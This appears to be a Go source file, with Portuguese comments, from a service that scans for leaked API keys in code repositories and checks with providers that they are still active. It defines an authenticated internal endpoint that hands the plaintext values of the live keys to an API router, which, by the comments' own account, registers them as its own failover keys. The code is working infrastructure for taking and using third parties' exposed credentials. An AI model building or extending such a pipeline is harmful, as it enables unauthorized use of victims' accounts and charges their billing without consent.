package main

// Endpoint service-to-service que o Roteador de APIs (api-go) consome
// periodicamente pra importar no failover as chaves vazadas que o scanner
// confirmou ativas. Autenticado por um segredo compartilhado
// (INTERNAL_SYNC_TOKEN) via header x-sync-token — comparado em tempo
// constante — e desabilitado (503) quando o token não está configurado.

import (
	"crypto/subtle"
	"net/http"
)

// syncHitsMaxSize é o teto de hits devolvidos ao sincronizador (api-go).
const syncHitsMaxSize = 2000

// handleInternalSyncHits responde {hits: [...]} com os hits que têm valor
// real capturado E confirmação ativa do provedor (LiveActive) — exatamente o
// conjunto que o roteador de APIs deve cadastrar como chave de failover.
func (s *Server) handleInternalSyncHits(w http.ResponseWriter, r *http.Request) {
	if s.cfg.InternalSyncToken == "" {
		writeError(w, http.StatusServiceUnavailable, "sync_not_configured", "sync interno não configurado")
		return
	}
	got := r.Header.Get("x-sync-token")
	if subtle.ConstantTimeCompare([]byte(got), []byte(s.cfg.InternalSyncToken)) != 1 {
		writeError(w, http.StatusUnauthorized, "unauthorized", "token de sync inválido")
		return
	}

	hits, err := s.es.ListVerifiableHits(r.Context())
	if err != nil {
		writeError(w, http.StatusBadGateway, "elasticsearch_error", err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"hits": syncPayload(activeSyncHits(hits, syncHitsMaxSize))})
}

// syncHit é o único formato de saída deste serviço que carrega o valor da chave
// em claro. Existe porque o roteador de APIs precisa da chave em si para
// cadastrá-la no failover (ele recifra no próprio cofre, ver api-go
// sync_apirouter.go) — Hit.MatchedValue é `json:"-"` justamente para que esse
// vazamento seja explícito e restrito a este endpoint, autenticado por
// INTERNAL_SYNC_TOKEN e nunca por sessão de navegador.
type syncHit struct {
	Keyword        string `json:"keyword"`
	RepoFullName   string `json:"repoFullName"`
	MatchedValue   string `json:"matchedValue"`
	VerifierFamily string `json:"verifierFamily"`
	LiveActive     bool   `json:"liveActive"`
	LiveSandbox    bool   `json:"liveSandbox"`
}

func syncPayload(hits []Hit) []syncHit {
	out := make([]syncHit, 0, len(hits))
	for _, h := range hits {
		if h.MatchedValue == "" {
			continue // sem cofre ou blob ilegível: nada a sincronizar
		}
		out = append(out, syncHit{
			Keyword:        h.Keyword,
			RepoFullName:   h.RepoFullName,
			MatchedValue:   h.MatchedValue,
			VerifierFamily: h.VerifierFamily,
			LiveActive:     h.LiveActive,
			LiveSandbox:    h.LiveSandbox,
		})
	}
	return out
}

// activeSyncHits filtra só os hits prontos pra virar chave no roteador:
// valor real capturado E confirmação ativa do provedor. liveActive=true só
// acontece com liveChecked=true (ver verifiers.go), então um campo basta.
// Cap em maxSize pra não estourar o payload.
func activeSyncHits(hits []Hit, maxSize int) []Hit {
	out := make([]Hit, 0, min(len(hits), maxSize))
	for _, h := range hits {
		if !h.LiveActive {
			continue
		}
		out = append(out, h)
		if len(out) >= maxSize {
			break
		}
	}
	return out
}
